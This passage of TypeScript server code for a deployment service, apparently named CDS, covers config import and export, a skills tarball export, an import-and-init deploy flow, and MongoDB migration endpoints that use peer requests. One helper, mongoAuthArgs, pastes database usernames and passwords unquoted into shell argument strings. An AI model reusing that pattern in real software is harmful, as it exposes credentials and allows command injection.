          type: 'import-replace-all',
          snapshotId: snapshot.id,
          summary: `replace-all 导入配置：清空 4 件套并重新导入（${(cfg.buildProfiles as BuildProfile[] | undefined)?.length ?? 0} 个 profile / ${infraDefs.length} 个 infra）`,
        });
      }

      res.json({
        valid: true,
        preview,
        applied: true,
        cleanMode,
        branchPolicy,
        infraResults,
        snapshotId: snapshot.id,
        snapshotLabel: snapshot.label,
        branchActions,
        warnings: validation.warnings,
        message: cleanMode === 'replace-all'
          ? '配置已清空并重新导入（快照已保存，可在「历史版本」一键回滚）'
          : '配置已合并导入（快照已保存，可在「历史版本」回滚）',
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // GET /api/export-config[?project=<id>] — export config as CDS Compose YAML.
  // FU-04 isolation sweep (2026-04-24): scope by ?project= so the YAML
  // only contains the requested project's profiles/infra/rules + that
  // project's env (_global baseline + project overrides). Without the
  // query param we keep legacy behaviour (everything globally) for
  // back-compat with existing tooling that calls it bare.
  router.get('/export-config', (req, res) => {
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const profiles = projectFilter
      ? stateService.getBuildProfilesForProject(projectFilter)
      : stateService.getBuildProfiles();
    const envVars = projectFilter
      ? stateService.getCustomEnv(projectFilter)
      : stateService.getCustomEnv();
    const infra = projectFilter
      ? stateService.getInfraServicesForProject(projectFilter)
      : stateService.getInfraServices();
    const rules = projectFilter
      ? stateService.getRoutingRulesForProject(projectFilter)
      : stateService.getRoutingRules();

    const yamlContent = toCdsCompose(profiles, envVars, infra, rules);
    res.type('text/yaml').send(yamlContent);
  });

  // GET /api/cli-version — return the currently-bundled cdscli VERSION.
  // Shared with the global X-Cds-Cli-Latest response header so CLI drift
  // detection and the explicit version endpoint cannot diverge.
  router.get('/cli-version', (_req, res) => {
    const version = readBundledCdsCliVersion(config.repoRoot);
    if (!version) {
      res.status(404).json({ error: '未找到 cdscli VERSION 常量' });
      return;
    }
    res.json({ version });
  });

  // GET /api/export-skill — export all CDS skills as a single tar.gz bundle
  //
  // 打包内容（全量，不分 legacy / unified）：
  //   .claude/skills/cds/                — 统一技能（主入口 + CLI + reference）
  //   .claude/skills/cds-deploy-pipeline/ — 部署流水线技能
  //   .claude/skills/cds-project-scan/   — 扫描技能（向后兼容旧工作流）
  //
  // 旧入参 `?legacy=1` 保留：仍能仅导出 cds-project-scan（向后兼容）。
  router.get('/export-skill', (req, res) => {
    try {
      const useLegacy = req.query.legacy === '1';

      // 解析 skills 根目录：优先 config.repoRoot，兜底父目录（CDS 部署为子目录时）
      const skillsRoot = ((): string => {
        const primary = path.join(config.repoRoot, '.claude', 'skills');
        if (fs.existsSync(primary)) return primary;
        const parent = path.join(config.repoRoot, '..', '.claude', 'skills');
        if (fs.existsSync(parent)) return parent;
        return primary; // 返回原路径，后续报错
      })();

      // Build pack in a temp directory
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
      const packName = useLegacy ? `cds-project-scan-skill-${timestamp}` : `cds-skills-${timestamp}`;
      const tmpDir = path.join(config.repoRoot, '.cds', 'tmp');
      const packDir = path.join(tmpDir, packName);

      const copyRecursive = (src: string, dst: string) => {
        const stat = fs.statSync(src);
        if (stat.isDirectory()) {
          fs.mkdirSync(dst, { recursive: true });
          for (const entry of fs.readdirSync(src)) {
            copyRecursive(path.join(src, entry), path.join(dst, entry));
          }
        } else {
          fs.copyFileSync(src, dst);
        }
      };

      // 要打包的技能列表
      const skillsToCopy: string[] = useLegacy
        ? ['cds-project-scan']
        : ['cds', 'cds-deploy-pipeline', 'cds-project-scan'];

      let copiedCount = 0;
      for (const skillName of skillsToCopy) {
        const skillDir = path.join(skillsRoot, skillName);
        if (!fs.existsSync(skillDir)) continue;
        const targetSkillDir = path.join(packDir, '.claude', 'skills', skillName);
        fs.mkdirSync(targetSkillDir, { recursive: true });
        copyRecursive(skillDir, targetSkillDir);
        copiedCount++;
      }

      if (copiedCount === 0) {
        res.status(404).json({ error: `未找到 CDS 技能目录（已查找：${skillsRoot}）` });
        return;
      }

      // README tailored to the new unified skill
      const readme = useLegacy
        ? `# CDS 部署技能包 (legacy: cds-project-scan)\n\n将 \`.claude/skills/cds-project-scan/\` 复制到目标项目的对应路径。\n`
        : `# CDS 技能包（全套，共 ${copiedCount} 个技能）

包含：cds（主技能）、cds-deploy-pipeline（部署流水线）、cds-project-scan（扫描）。
覆盖 CDS 全生命周期：扫描项目 → Agent 鉴权 → 部署 → 就绪检测 → 分层冒烟 → 故障诊断。

## 三分钟安装

\`\`\`bash
# 1. 解压到你项目的根目录（会在 .claude/skills/ 下放置所有 cds 技能）
tar -xzf ${packName}.tar.gz --strip-components=1

# 2. 加 alias（推荐）
echo 'alias cdscli="python3 \\$(git rev-parse --show-toplevel)/.claude/skills/cds/cli/cdscli.py"' >> ~/.bashrc
source ~/.bashrc

# 3. 初始化（交互式）
cdscli init

# 4. 验证
cdscli auth check
cdscli project list --human
\`\`\`

## 主要命令

| 命令 | 用途 |
|------|------|
| \`cdscli init\` | 首次配置 CDS_HOST / AI_ACCESS_KEY / 默认 projectId |
| \`cdscli scan --apply-to-cds <projectId>\` | 扫描本地 → 生成 compose YAML → 提交 CDS 审批 |
| \`cdscli deploy\` | 推代码 + 部署 + 等待 + 冒烟（一条命令）|
| \`cdscli help-me-check <branchId>\` | 出 bug 了？这条命令抓状态+日志+env+history+根因分析 |
| \`cdscli smoke <branchId>\` | 分层冒烟（L1 根路径 / L2 API / L3 认证 API）|
| \`cdscli --help\` | 完整命令树 |

## 详细文档

| 文件 | 何时看 |
|------|--------|
| \`.claude/skills/cds/SKILL.md\` | Claude Code 自动加载，主入口 |
| \`.claude/skills/cds/reference/api.md\` | 需要 curl 直调 API |
| \`.claude/skills/cds/reference/auth.md\` | 401 / 403 排查 |
| \`.claude/skills/cds/reference/scan.md\` | 扫描规则 & compose YAML 契约 |
| \`.claude/skills/cds/reference/smoke.md\` | 分层冒烟策略 |
| \`.claude/skills/cds/reference/diagnose.md\` | 容器日志 → 根因决策树 |
| \`.claude/skills/cds/reference/drop-in.md\` | 新项目接入完整步骤 |

## 升级

直接重新下载本包覆盖即可，\`~/.cdsrc\` 不受影响。

## 反馈

缺功能 / 新根因模式 / 扫描误判 → 把 \`cdscli diagnose <branchId>\` 输出贴给维护方。
`;
      fs.writeFileSync(path.join(packDir, 'README.md'), readme, 'utf-8');

      // Create tar.gz using tar command (available on all Linux)
      const tarName = `${packName}.tar.gz`;
      execSync(`cd "${tmpDir}" && tar -czf "${tarName}" "${packName}/"`, { stdio: 'pipe' });

      // Clean up pack dir
      fs.rmSync(packDir, { recursive: true, force: true });

      // Send tar.gz
      const tarPath = path.join(tmpDir, tarName);
      const stat = fs.statSync(tarPath);
      res.setHeader('Content-Type', 'application/gzip');
      res.setHeader('Content-Disposition', `attachment; filename="${tarName}"`);
      res.setHeader('Content-Length', stat.size);
      const stream = fs.createReadStream(tarPath);
      stream.pipe(res);
      stream.on('end', () => {
        fs.unlink(tarPath, () => {});
      });
    } catch (e) {
      console.error('export-skill error:', e);
      if (!res.headersSent) {
        res.status(500).json({ error: '导出失败: ' + (e as Error).message });
      }
    }
  });

  // POST /api/import-and-init — import config + start infra + create main branch + deploy (SSE progress)
  // Same config parsing as /import-config, but after applying config it also:
  //   1. Starts all new infra services
  //   2. Creates a main branch worktree (if not exists)
  //   3. Deploys the main branch (build + run all profiles)
  router.post('/import-and-init', async (req, res) => {
    const { config: configBlob } = req.body as { config: unknown };

    // ── Parse config (same logic as import-config) ──
    let cfg: Record<string, unknown>;
    if (typeof configBlob === 'string') {
      const cdsConfig = parseCdsCompose(configBlob);
      if (cdsConfig) {
        cfg = {
          $schema: 'cds-config',
          buildProfiles: cdsConfig.buildProfiles,
          envVars: cdsConfig.envVars,
          infraServices: cdsConfig.infraServices.length > 0 ? cdsConfig.infraServices : undefined,
          routingRules: cdsConfig.routingRules.length > 0 ? cdsConfig.routingRules : undefined,
        };
      } else {
        try {
          cfg = JSON.parse(configBlob);
        } catch {
          res.status(400).json({ error: '无法解析配置：既不是有效的 CDS Compose YAML，也不是有效的 JSON' });
          return;
        }
      }
    } else {
      cfg = configBlob as Record<string, unknown>;
    }

    // Validate
    const validation = validateConfigBlob(cfg);
    if (!validation.valid) {
      res.status(400).json({ valid: false, errors: validation.errors });
      return;
    }

    // ── Start SSE stream ──
    initSSE(res);
    const send = (step: string, status: string, title: string) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString() });
    };

    try {
      // ── Phase 1: Apply config ──
      send('config', 'running', '正在写入配置...');

      // Apply build profiles
      if (Array.isArray(cfg.buildProfiles)) {
        for (const p of cfg.buildProfiles as BuildProfile[]) {
          const existing = stateService.getBuildProfile(p.id);
          if (existing) {
            stateService.updateBuildProfile(p.id, p);
          } else {
            p.workDir = p.workDir || '.';
            p.containerPort = p.containerPort || 8080;
            stateService.addBuildProfile(p);
          }
        }
      }

      // Apply env vars
      if (cfg.envVars && typeof cfg.envVars === 'object') {
        for (const [key, value] of Object.entries(cfg.envVars as Record<string, string>)) {
          stateService.setCustomEnvVar(key, value);
        }
      }

      // Apply routing rules
      if (Array.isArray(cfg.routingRules)) {
        for (const r of cfg.routingRules as RoutingRule[]) {
          const existing = stateService.getRoutingRules().find(x => x.id === r.id);
          if (existing) {
            stateService.updateRoutingRule(r.id, r);
          } else {
            r.priority = r.priority ?? 0;
            r.enabled = r.enabled ?? true;
            stateService.addRoutingRule(r);
          }
        }
      }

      // Apply infra service definitions (don't start yet)
      // PR_B.1: /import-and-init 历史全局端点没带 projectId — 兜底 legacy。
      const initInfraProjectId =
        stateService.getLegacyProject()?.id ?? 'default';
      const infraDefs = resolveInfraDefs(cfg);
      const newInfraServices: InfraService[] = [];
      for (const def of infraDefs) {
        if (stateService.getInfraService(def.id)) continue;
        if (def.id && def.dockerImage && def.containerPort) {
          const service = composeDefToInfraService(def, initInfraProjectId);
          stateService.addInfraService(service);
          newInfraServices.push(service);
        }
      }

      syncCdsConfig();
      stateService.save();
      send('config', 'done', `配置已写入 (${stateService.getBuildProfiles().length} 个构建配置, ${newInfraServices.length} 个基础设施)`);

      // ── Phase 2: Start infra services ──
      const allInfra = stateService.getInfraServices();
      const infraToStart = allInfra.filter(s => s.status !== 'running');
      if (infraToStart.length > 0) {
        send('infra', 'running', `正在启动 ${infraToStart.length} 个基础设施服务...`);
        for (const svc of infraToStart) {
          send(`infra-${svc.id}`, 'running', `正在启动 ${svc.name} (${svc.dockerImage})...`);
          try {
            // Phase 1: 传项目 customEnv 让 ${VAR} 展开
            await containerService.startInfraService(svc, stateService.getCustomEnv(svc.projectId));
            stateService.updateInfraService(svc.id, { status: 'running', errorMessage: undefined });
            send(`infra-${svc.id}`, 'done', `${svc.name} 已启动 → :${svc.hostPort}`);
          } catch (err) {
            stateService.updateInfraService(svc.id, { status: 'error', errorMessage: (err as Error).message });
            send(`infra-${svc.id}`, 'error', `${svc.name} 启动失败: ${(err as Error).message}`);
          }
        }
        stateService.save();
        send('infra', 'done', '基础设施服务就绪');
      } else {
        send('infra', 'done', '基础设施服务已在运行中');
      }

      // ── Phase 3: Create main branch worktree ──
      // Detect default branch name
      let mainBranch = 'main';
      try {
        const result = await shell.exec('git symbolic-ref refs/remotes/origin/HEAD', { cwd: config.repoRoot, timeout: 5000 });
        const ref = result.stdout.trim(); // e.g., refs/remotes/origin/main
        if (ref) mainBranch = ref.replace('refs/remotes/origin/', '');
      } catch {
        // Fallback: try 'main', then 'master'
        try {
          await shell.exec('git rev-parse --verify origin/main', { cwd: config.repoRoot, timeout: 5000 });
          mainBranch = 'main';
        } catch {
          mainBranch = 'master';
        }
      }

      // PR #498 second-round review (Bugbot): the initialize flow
      // previously used the bare slugified branch as the entry id (and
      // looked up by it), which contradicts every other code path
      // (POST /api/branches, auto-build in index.ts, webhook dispatcher)
      // that uses `${owner.slug}-${slugified}` for non-legacy projects.
      // After rename-default a re-run of init would miss the existing
      // `prd-agent-main` entry and try to create a duplicate `main`.
      //
      // Resolve the owner project up-front so both lookup AND creation
      // share the same id formula, with a (projectId, branch) tuple
      // fallback for legacyFlag-flipped historical entries.
      const mainSlug = StateService.slugify(mainBranch);
      const owner = stateService.resolveProjectForAutoBuild(config.repoRoot);
      if (!owner) {
        send('worktree', 'error', '无法定位项目所属（state 中无可识别的默认项目）');
        res.end();
        return;
      }
      const mainBranchId = owner.legacyFlag ? mainSlug : `${owner.slug}-${mainSlug}`;
      let entry =
        stateService.getBranch(mainBranchId) ??
        stateService.findBranchByProjectAndName(owner.id, mainBranch);

      if (!entry) {
        send('worktree', 'running', `正在为 ${mainBranch} 创建工作树...`);
        const worktreePath = WorktreeService.worktreePathFor(config.worktreeBase, owner.id, mainBranchId);
        await shell.exec(`mkdir -p "${path.posix.dirname(worktreePath)}"`);
        await worktreeService.create(config.repoRoot, mainBranch, worktreePath);

        entry = {
          id: mainBranchId,
          projectId: owner.id,
          branch: mainBranch,
          worktreePath,
          services: {},
          status: 'idle',
          createdAt: new Date().toISOString(),
        };
        applyProjectDefaultDeployModes(
          entry,
          owner.defaultDeployModes,
          stateService.getBuildProfilesForProject(owner.id),
        );
        stateService.addBranch(entry);
        // 项目刚创建，没默认分支 → 用刚建出来的 main 分支兜底（per-project）。
        // 2026-04-27 (Codex P2): 不再 AND state.defaultBranch — 多项目环境下
        // state.defaultBranch 经常已经被另一个项目设过，这种检查会让新项目
        // 永远拿不到自己的 defaultBranch，downstream getDefaultBranchFor
        // 又被迫回落到别的项目的默认分支，造成 mis-pin。每个项目独立判断。
        const ownerProject = stateService.getProject(owner.id);
        if (!ownerProject?.defaultBranch) {
          stateService.setProjectDefaultBranch(owner.id, entry.id);
        }
        stateService.save();
        send('worktree', 'done', `工作树已创建: ${mainBranch}`);
      } else {
        send('worktree', 'done', `工作树已存在: ${mainBranch}`);
      }

      // ── Phase 4: Deploy main branch (build + run all profiles + branch extras) ──
      // PR #498 round-4 review (Bugbot): use the project-scoped query
      // so multi-project setups don't deploy every project's profiles
      // under the owner's branch entry. Matches the auto-build path
      // in index.ts:1097 and webhook deploy flows.
      // 项目底座(保留 owner.id 兜底的 projectId 解析) + 本分支额外服务。
      const profiles = mergeBranchProfiles(
        stateService.getBuildProfilesForProject(entry.projectId || owner.id),
        entry,
      );
      if (profiles.length > 0) {
        send('deploy', 'running', `正在部署 ${mainBranch} (${profiles.length} 个服务)...`);

        entry.status = 'building';
        // 本轮（首次 clone 后）构建起点锚点，供预览等待页 ETA（见 BranchEntry.lastDeployStartedAt）。
        entry.lastDeployStartedAt = new Date().toISOString();
        stateService.save();

        // Pre-allocate ports
        for (const profile of profiles) {
          if (!entry.services[profile.id]) {
            const liveUsedPorts = await collectListeningPorts(shell);
            const hostPort = stateService.allocatePort(config.portStart, liveUsedPorts);
            liveUsedPorts.add(hostPort);
            entry.services[profile.id] = {
              profileId: profile.id,
              // PR #498 round-3 review (Bugbot): container name must
              // track entry.id. After round-2 made mainBranchId
              // `${owner.slug}-${mainSlug}` for non-legacy projects,
              // the hardcoded `cds-${mainSlug}-…` here became a
              // mismatch — same pattern index.ts:1105 already follows.
              containerName: `cds-${entry.id}-${profile.id}`,
              hostPort,
              status: 'idle',
            };
          }
        }
        stateService.save();

        const mergedEnv = getMergedEnv(entry.projectId, entry.id);

        for (const profile of profiles) {
          const svc = entry.services[profile.id];
          send(`deploy-${profile.id}`, 'running', `正在构建 ${profile.name}...`);
          svc.status = 'building';

          try {
            await archiveBranchContainerLogs({
              stateService,
              containerService,
              branch: entry,
              source: 'pre-deploy-recreate',
              profileIds: new Set([profile.id]),
              serverEventLogStore,
              message: 'captured before docker rm/run during import deploy',
              requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
              actor: resolveActorFromRequest(req),
              trigger: triggerFromRequest(req),
            });
            await runServiceWithPortRetry({
              stateService,
              shell,
              config,
              containerService,
              serverEventLogStore,
              entry,
              profile,
              service: svc,
              customEnv: mergedEnv,
              onPortChanged: ({ oldPort, newPort }) => {
                send(`port-${profile.id}`, 'warning', `${profile.name} 端口 ${oldPort} 已占用，改用 :${newPort} 重试`);
              },
              onOutput: (chunk) => {
                sendSSE(res, 'log', { profileId: profile.id, chunk });
              },
            });

            svc.status = 'running';
            svc.errorMessage = undefined;
            // 2026-05-14 真实态徽章：import-and-init 用裸 profile 构建
            // （runService 直接吃 profile.*），钉住其 activeDeployMode。
            svc.deployedMode = profile.activeDeployMode || '';
            send(`deploy-${profile.id}`, 'done', `${profile.name} 就绪 → :${svc.hostPort}`);
          } catch (err) {
            svc.status = 'error';
            entry.errorMessage = (err as Error).message;
            send(`deploy-${profile.id}`, 'error', `${profile.name} 构建失败: ${(err as Error).message}`);
          }
        }

        const hasError = Object.values(entry.services).some(s => s.status === 'error');
        entry.status = hasError ? 'error' : 'running';
        stateService.save();

        send('deploy', hasError ? 'error' : 'done',
          hasError ? '部分服务构建失败' : `部署完成，所有服务已就绪`);
      }

      send('complete', 'done', '初始化完成');
      sendSSE(res, 'done', { message: '初始化完成' });
    } catch (err) {
      send('error', 'error', `初始化失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
    }

    res.end();
  });

  // ── Self-update: switch CDS's own branch, pull, and restart ──

  // ── Data Migration ──

  /** Resolve 'local' MongoDB connection to actual host:port from infra */
  function resolveMongoConn(conn: MongoConnectionConfig): MongoConnectionConfig {
    if (conn.type === 'local') {
      const mongoInfra = stateService.getInfraServices().find(s => s.id === 'mongodb');
      if (!mongoInfra) throw new Error('本机 MongoDB 未在 CDS 基础设施中注册');
      const dockerHost = stateService.getCdsEnvVars()['CDS_HOST'] || '172.17.0.1';
      return { ...conn, host: dockerHost, port: mongoInfra.hostPort };
    }
    return conn;
  }

  /** Build mongosh auth args */
  function mongoAuthArgs(conn: MongoConnectionConfig): string {
    let args = '';
    if (conn.username) args += ` -u ${conn.username}`;
    if (conn.password) args += ` -p ${conn.password}`;
    if (conn.authDatabase) args += ` --authenticationDatabase ${conn.authDatabase}`;
    return args;
  }

  /** Get this CDS's own AI access key (used to display to the user for copy/paste).
   *  优先级：dashboard customEnv 里用户配的 AI_ACCESS_KEY > CDS_AI_ACCESS_KEY (canonical)
   *  > legacy AI_ACCESS_KEY。前者是 dashboard UI 字段名（保持不动），后两个是
   *  CDS 进程级静态钥匙。 */
  function getLocalAccessKey(): string | null {
    return stateService.getCustomEnv()['AI_ACCESS_KEY']
      || process.env.CDS_AI_ACCESS_KEY
      || process.env.AI_ACCESS_KEY
      || null;
  }

  /** Best-effort public base URL of this CDS, derived from the current request */
  function guessLocalBaseUrl(req: import('express').Request): string {
    const proto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const host = (req.headers['x-forwarded-host'] as string) || req.headers.host || 'localhost';
    return `${proto}://${host}`;
  }

  /**
   * Make an authenticated HTTP/S request to a CDS peer. Returns the raw
   * response object so the caller can stream the body.
   */
  function peerRequest(
    peer: CdsPeer,
    apiPath: string,
    method: 'GET' | 'POST' | 'PUT' | 'DELETE',
    body?: unknown,
  ): Promise<http.IncomingMessage> {
    return new Promise((resolve, reject) => {
      let url: URL;
      try { url = new URL(peer.baseUrl.replace(/\/$/, '') + apiPath); } catch (e) { reject(e); return; }
      const lib = url.protocol === 'https:' ? https : http;
      const payload = body !== undefined ? Buffer.from(JSON.stringify(body)) : null;
      const req = lib.request({
        method,
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        headers: {
          'X-AI-Access-Key': peer.accessKey,
          'X-CDS-Peer-Call': '1',
          Accept: 'application/json, application/octet-stream',
          ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': String(payload.length) } : {}),
        },
        // Large dumps can take many minutes — disable the 2-minute default.
        timeout: 0,
      }, (res) => resolve(res));
      req.on('error', reject);
      req.setTimeout(0);
      if (payload) req.write(payload);
      req.end();
    });
  }

  /** Make a peer request and parse the response body as JSON */
  async function peerRequestJson<T>(peer: CdsPeer, apiPath: string, method: 'GET' | 'POST' | 'PUT' | 'DELETE', body?: unknown): Promise<T> {
    const res = await peerRequest(peer, apiPath, method, body);
    const chunks: Buffer[] = [];
    for await (const c of res) chunks.push(c as Buffer);
    const text = Buffer.concat(chunks).toString('utf-8');
    if ((res.statusCode || 500) >= 400) {
      let err = text;
      try { const j = JSON.parse(text); err = j.error || j.message || text; } catch { /* raw */ }
      throw new Error(`远程 CDS 返回 ${res.statusCode}: ${err}`);
    }
    try { return JSON.parse(text) as T; } catch { return text as unknown as T; }
  }

  // GET /api/data-migrations — list all migration tasks
  router.get('/data-migrations', (_req, res) => {
    res.json(stateService.getDataMigrations());
  });

  // POST /api/data-migrations — create a new migration task
  router.post('/data-migrations', (req, res) => {
    const { name, dbType, source, target, collections } = req.body as {
      name: string;
      dbType: 'mongodb';
      source: MongoConnectionConfig;
      target: MongoConnectionConfig;
      collections?: string[];
    };
    if (!name || !dbType || !source || !target) {
      res.status(400).json({ error: '缺少必填字段: name, dbType, source, target' });
      return;
    }
    const id = `mig-${Date.now().toString(36)}`;
    const migration: DataMigration = {
      id,
      name,
      dbType,
      source,
      target,
      collections: collections?.length ? collections : undefined,
      status: 'pending',
      progress: 0,
      createdAt: new Date().toISOString(),
    };
    stateService.addDataMigration(migration);
    stateService.save();
    res.json(migration);
  });

  // DELETE /api/data-migrations/:id — delete a migration task
  router.delete('/data-migrations/:id', (req, res) => {
    const { id } = req.params;
    const migration = stateService.getDataMigration(id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (migration.status === 'running') { res.status(400).json({ error: '任务正在运行中，无法删除' }); return; }
    stateService.removeDataMigration(id);
    stateService.save();
    res.json({ message: '已删除' });
  });

  // POST /api/data-migrations/check-tools — check if mongodump/mongorestore are available, auto-install if not
  router.post('/data-migrations/check-tools', async (_req, res) => {
    try {
      // Check if mongodump exists
      const checkResult = await shell.exec('which mongodump 2>/dev/null || which /usr/bin/mongodump 2>/dev/null || echo "NOT_FOUND"');
      const hasTool = !checkResult.stdout.includes('NOT_FOUND');
      if (hasTool) {
        // Get version
        const verResult = await shell.exec('mongodump --version 2>&1 | head -1');
        res.json({ installed: true, version: verResult.stdout.trim() });
        return;
      }
      // Auto-install mongodb-database-tools
      res.json({ installed: false, message: '正在安装 mongodb-database-tools...' });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/install-tools — install mongodump/mongorestore
  router.post('/data-migrations/install-tools', async (_req, res) => {
    initSSE(res);
    const send = (msg: string) => sendSSE(res, 'progress', { message: msg });
    try {
      send('检测操作系统...');
      const osInfo = await shell.exec('cat /etc/os-release 2>/dev/null || echo "unknown"');
      const isDebian = osInfo.stdout.includes('debian') || osInfo.stdout.includes('ubuntu');
      const isAlpine = osInfo.stdout.includes('alpine');
      const isRhel = osInfo.stdout.includes('rhel') || osInfo.stdout.includes('centos') || osInfo.stdout.includes('fedora');

      if (isDebian) {
        send('检测到 Debian/Ubuntu，正在安装 mongodb-database-tools...');
        // Try apt-get first
        const aptResult = await shell.exec(
          'apt-get update -qq 2>/dev/null && apt-get install -y -qq mongodb-database-tools 2>&1 || echo "APT_FAILED"',
          { timeout: 120000 }
        );
        if (aptResult.stdout.includes('APT_FAILED')) {
          // Fallback: download from MongoDB directly
          send('apt 安装失败，尝试直接下载二进制文件...');
          await installMongoToolsBinary(shell, send);
        } else {
          send('apt 安装成功');
        }
      } else if (isAlpine) {
        send('检测到 Alpine，直接下载二进制文件...');
        await installMongoToolsBinary(shell, send);
      } else if (isRhel) {
        send('检测到 RHEL/CentOS，正在安装...');
        const yumResult = await shell.exec(
          'yum install -y mongodb-database-tools 2>&1 || dnf install -y mongodb-database-tools 2>&1 || echo "YUM_FAILED"',
          { timeout: 120000 }
        );
        if (yumResult.stdout.includes('YUM_FAILED')) {
          send('yum 安装失败，尝试直接下载二进制文件...');
          await installMongoToolsBinary(shell, send);
        }
      } else {
        send('未知系统，尝试直接下载二进制文件...');
        await installMongoToolsBinary(shell, send);
      }

      // Verify installation
      const verifyResult = await shell.exec('mongodump --version 2>&1 | head -1');
      if (verifyResult.exitCode === 0 && verifyResult.stdout.trim()) {
        sendSSE(res, 'done', { installed: true, version: verifyResult.stdout.trim() });
      } else {
        sendSSE(res, 'error', { message: '安装后验证失败，请手动安装 mongodb-database-tools' });
      }
      res.end();
    } catch (e) {
      sendSSE(res, 'error', { message: (e as Error).message });
      res.end();
    }
  });

  // PUT /api/data-migrations/:id — edit a migration task (name, source, target, collections)
  router.put('/data-migrations/:id', (req, res) => {
    const { id } = req.params;
    const existing = stateService.getDataMigration(id);
    if (!existing) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (existing.status === 'running') { res.status(400).json({ error: '任务正在运行中，无法编辑' }); return; }
    const { name, source, target, collections } = req.body as Partial<DataMigration>;
    const updates: Partial<DataMigration> = {};
    if (name !== undefined) updates.name = name;
    if (source !== undefined) updates.source = source;
    if (target !== undefined) updates.target = target;
    // collections === [] means "all collections" (undefined), non-empty = subset
    if (collections !== undefined) updates.collections = (collections && collections.length) ? collections : undefined;
    updates.updatedAt = new Date().toISOString();
    stateService.updateDataMigration(id, updates);
    stateService.save();
    res.json(stateService.getDataMigration(id));
  });

  // POST /api/data-migrations/:id/execute — execute a migration task (SSE stream, streaming pipeline)
  //
  // Pipeline:
  //   source producer (mongodump stdout) → pipe → target consumer (mongorestore stdin)
  //
  // Producers (by source.type):
  //   - local  : spawn mongodump against CDS infra MongoDB
  //   - remote : spawn mongodump; or ssh jump → remote mongodump (pipe mode, no port forwarding)
  //   - cds    : HTTP POST to peer's /local-dump endpoint, read response body
  //
  // Consumers (by target.type):
  //   - local  : spawn mongorestore against CDS infra MongoDB, write to stdin
  //   - remote : spawn mongorestore; or ssh jump → remote mongorestore (stdin pipe)
  //   - cds    : HTTP POST to peer's /local-restore endpoint, request body is the stream
  //
  // Zero temp files. Archive+gzip throughout. SSH keepalive so long dumps don't drop.
  router.post('/data-migrations/:id/execute', async (req, res) => {
    const { id } = req.params;
    const migration = stateService.getDataMigration(id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (migration.status === 'running') { res.status(400).json({ error: '任务已在运行中' }); return; }

    initSSE(res);
    const send = (progress: number, message: string) => {
      sendSSE(res, 'progress', { progress, message });
      stateService.updateDataMigration(id, { progress, progressMessage: message });
    };

    // SSE keepalive — prevents proxies from closing the connection on long dumps
    const keepAlive = setInterval(() => { try { res.write(`:ka\n\n`); } catch { /* client gone */ } }, 15000);

    // Mark as running
    stateService.updateDataMigration(id, { status: 'running', startedAt: new Date().toISOString(), progress: 0, errorMessage: undefined, log: '' });
    stateService.save();

    let logOutput = '';
    const MAX_LOG = 64 * 1024;
    const appendLog = (line: string) => {
      logOutput += line;
      if (!line.endsWith('\n')) logOutput += '\n';
      if (logOutput.length > MAX_LOG) logOutput = '...(truncated)...\n' + logOutput.slice(-MAX_LOG);
    };

    // Persist log + progress periodically (not on every chunk) to avoid disk thrash
    let lastPersistAt = 0;
    const maybePersist = () => {
      const now = Date.now();
      if (now - lastPersistAt > 2000) {
        lastPersistAt = now;
        stateService.updateDataMigration(id, { log: logOutput });
        stateService.save();
      }
    };

    // Resources to clean up on exit
    const children: Array<{ kill: () => void }> = [];
    const cleanup = () => {
      clearInterval(keepAlive);
      for (const c of children) { try { c.kill(); } catch { /* */ } }
    };

    // Track the most recent progress line so we can turn it into SSE progress
    let fakeProgress = 20; // ratchet 20→90 based on line activity
    const bumpProgress = (delta: number) => { fakeProgress = Math.min(90, fakeProgress + delta); };
    const updateProgressFromLine = (line: string) => {
      const parsed = parseMongoProgressLine(line);
      if (parsed) {
        bumpProgress(1);
        send(fakeProgress, parsed);
      }
    };

    try {
      const cols = migration.collections?.length ? migration.collections : undefined;

      send(2, '准备迁移管道...');

      // ── Build producer ──
      const producer = await buildSourceProducer(
        migration.source,
        cols,
        { appendLog, onProgressLine: updateProgressFromLine, send },
      );
      children.push(producer);

      // ── Build consumer ──
      const consumer = await buildTargetConsumer(
        migration.target,
        migration.source,
        cols,
        { appendLog, onProgressLine: updateProgressFromLine, send },
      );
      children.push(consumer);

      send(15, '管道已建立，开始传输...');

      // Pipe producer → consumer with error propagation
      producer.stdout.on('error', (err: Error) => appendLog(`[pipe] producer error: ${err.message}`));
      consumer.stdin.on('error', (err: Error) => appendLog(`[pipe] consumer error: ${err.message}`));
      producer.stdout.pipe(consumer.stdin);

      // Persist log every few seconds while streaming
      const persistTimer = setInterval(maybePersist, 2000);

      // Wait for both producer and consumer to finish
      await Promise.all([producer.done, consumer.done]);
      clearInterval(persistTimer);

      send(100, '迁移完成！');
      stateService.updateDataMigration(id, {
        status: 'completed',
        progress: 100,
        progressMessage: '迁移完成',
        finishedAt: new Date().toISOString(),
        log: logOutput,
      });
      stateService.save();
      sendSSE(res, 'done', { message: '迁移完成' });
      cleanup();
      res.end();
    } catch (e) {
      const errMsg = (e as Error).message || String(e);
      appendLog(`ERROR: ${errMsg}`);
      stateService.updateDataMigration(id, {
        status: 'failed',
        errorMessage: errMsg,
        finishedAt: new Date().toISOString(),
        log: logOutput,
      });
      stateService.save();
      sendSSE(res, 'error', { message: errMsg });
      cleanup();
      res.end();
    }
  });

  /**
   * Build a producer that emits a `mongodump --archive --gzip` byte stream.
   * Returns a handle with a readable `stdout`, a `done` promise, and `kill()`.
   */
  async function buildSourceProducer(
    source: MongoConnectionConfig,
    cols: string[] | undefined,
    cb: {
      appendLog: (s: string) => void;
      onProgressLine: (line: string) => void;
      send: (progress: number, message: string) => void;
    },
